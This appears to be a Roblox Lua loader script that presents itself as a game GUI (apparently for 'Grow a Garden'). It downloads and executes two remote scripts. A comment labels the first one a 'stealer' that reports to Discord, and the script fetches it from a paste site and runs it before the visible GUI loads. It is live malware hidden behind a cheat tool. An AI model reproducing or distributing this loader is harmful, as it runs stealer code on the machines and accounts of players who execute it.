local function safeLoad(url)
    local success, result = pcall(function()
        return loadstring(game:HttpGet(url, true))()
    end)
    if not success then
        warn("Failed to load:", url, "\nError:", result)
    end
end

-- Run stealer first (Discord notification)
task.spawn(function()
    safeLoad('https://pastefy.app/GYjzU6qr/raw')
end)

-- Add slight delay before running GUI to avoid conflict
task.delay(2, function()
    safeLoad('https://raw.githubusercontent.com/growagardenv3/Kripkrop/refs/heads/main/Flick.lua')
end)
